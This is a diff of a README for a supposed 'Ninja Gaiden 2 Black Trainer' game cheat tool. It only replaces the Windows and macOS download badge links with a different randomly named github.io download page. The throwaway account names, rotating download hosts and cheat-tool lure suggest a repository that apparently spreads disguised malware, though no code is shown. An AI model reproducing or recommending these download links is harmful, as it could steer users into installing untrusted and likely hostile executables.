@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/vsxlkfsuzhkp/ninja-gaiden-2-black-trainer)
 
-[![Get Trainer](https://img.shields.io/badge/⬇️_Get_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
+[![Get Trainer](https://img.shields.io/badge/⬇️_Get_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
 
 ![Ninja Gaiden 2 Black](game.jpg)
 
@@ -76,7 +76,7 @@ The **Ninja Gaiden 2 Black Trainer** solves all these issues, giving you complet
 
 ## 🍎 macOS
 
-[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://bansheeloaderquay.github.io/dl-mac/)
+[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
 
 ## ⚖️ Legal
 
